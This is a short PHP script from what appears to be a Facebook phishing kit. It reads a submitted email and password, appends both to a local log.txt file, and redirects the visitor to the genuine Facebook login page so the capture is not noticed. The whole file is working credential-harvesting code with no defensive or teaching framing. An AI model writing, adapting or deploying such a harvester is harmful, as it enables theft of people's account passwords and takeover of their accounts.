<?php
$fb_email = htmlspecialchars($_POST['fb_email']); //XSS Filter
$fb_password = htmlspecialchars($_POST['fb_password']); //XSS Filter
$file = fopen('log.txt', 'a');

fwrite($file, "Email: $fb_email Password: $fb_password  \n");
header('Location: https://facebook.com/login.php');

?>
